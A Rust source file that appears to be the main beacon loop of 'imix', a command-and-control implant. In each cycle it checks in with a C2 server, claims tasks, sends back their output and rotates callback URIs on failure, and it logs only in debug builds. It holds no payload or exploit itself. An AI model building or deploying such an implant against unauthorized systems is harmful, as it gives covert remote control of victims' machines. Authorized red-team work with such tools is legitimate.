use anyhow::Result;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{Duration, Instant};

use crate::agent::ImixAgent;
use crate::task::TaskRegistry;
use crate::version::VERSION;
use pb::c2;
use pb::config::Config;
use tokio::sync::mpsc;
use transport::{ActiveTransport, Transport};

pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);

pub async fn run_agent() -> Result<()> {
    init_logger();

    // Load config / defaults
    let config = Config::default_with_imix_version(VERSION);
    #[cfg(debug_assertions)]
    log::info!("Loaded config: {config:#?}");

    let run_once = config.run_once;

    // Initial transport is just a placeholder, we create active ones in the loop
    let transport = ActiveTransport::init();

    let handle = tokio::runtime::Handle::current();
    let task_registry = Arc::new(TaskRegistry::new());
    let (agent_struct, mut output_rx) =
        ImixAgent::new(config, transport, handle, task_registry.clone());
    let agent = Arc::new(agent_struct);

    // Track the last interval we slept for, as a fallback in case we fail to read the config
    let mut last_interval = agent.get_callback_interval_u64().unwrap_or(5);

    #[cfg(debug_assertions)]
    log::info!("Agent initialized");

    while !SHUTDOWN.load(Ordering::Relaxed) {
        let start = Instant::now();
        let agent_ref = agent.clone();
        let registry_ref = task_registry.clone();

        run_agent_cycle(agent_ref, registry_ref, &mut output_rx).await;

        if SHUTDOWN.load(Ordering::Relaxed) || run_once {
            break;
        }

        if let Ok(new_interval) = agent.get_callback_interval_u64() {
            last_interval = new_interval;
        }

        if let Err(e) = sleep_until_next_cycle(&agent, start).await {
            #[cfg(debug_assertions)]
            log::error!(
                "Failed to sleep, falling back to last interval {last_interval} sec: {e:#}"
            );

            // Prevent tight loop on config read failure
            tokio::time::sleep(Duration::from_secs(last_interval)).await;
        }
    }

    #[cfg(debug_assertions)]
    log::info!("Agent shutting down");

    Ok(())
}

pub fn init_logger() {
    #[cfg(debug_assertions)]
    {
        use pretty_env_logger;
        let _ = pretty_env_logger::formatted_timed_builder()
            .filter_level(log::LevelFilter::Info)
            .parse_env("IMIX_LOG")
            .try_init();
        log::info!("Starting imix agent");
    }
}

async fn run_agent_cycle(
    agent: Arc<ImixAgent<ActiveTransport>>,
    registry: Arc<TaskRegistry>,
    rx: &mut mpsc::UnboundedReceiver<c2::ReportTaskOutputRequest>,
) {
    // Refresh IP
    agent.refresh_ip().await;

    // Create new active transport
    let config = agent.get_transport_config().await;

    let transport = match ActiveTransport::new(config) {
        Ok(t) => t,
        Err(_e) => {
            #[cfg(debug_assertions)]
            log::error!("Failed to create transport: {_e:#}");
            agent.rotate_callback_uri().await;
            return;
        }
    };

    // Set transport
    agent.update_transport(transport).await;

    // Claim Tasks
    process_tasks(&agent, &registry).await;

    // Flush Outputs (send all buffered output)
    agent.flush_outputs(rx).await;

    // Disconnect (drop transport)
    agent.update_transport(ActiveTransport::init()).await;
}

async fn process_tasks(agent: &ImixAgent<ActiveTransport>, _registry: &TaskRegistry) {
    match agent.process_job_request().await {
        Ok(_) => {
            #[cfg(debug_assertions)]
            log::info!("Callback success");
        }
        Err(_e) => {
            #[cfg(debug_assertions)]
            log::error!("Callback failed: {_e:#}");
            agent.rotate_callback_uri().await;
        }
    }
}

async fn sleep_until_next_cycle(agent: &ImixAgent<ActiveTransport>, start: Instant) -> Result<()> {
    let interval = agent.get_callback_interval_u64()?;
    let delay = match interval.checked_sub(start.elapsed().as_secs()) {
        Some(secs) => Duration::from_secs(secs),
        None => Duration::from_secs(0),
    };
    #[cfg(debug_assertions)]
    log::info!(
        "Callback complete (duration={}s, sleep={}s)",
        start.elapsed().as_secs(),
        delay.as_secs()
    );
    tokio::time::sleep(delay).await;
    Ok(())
}
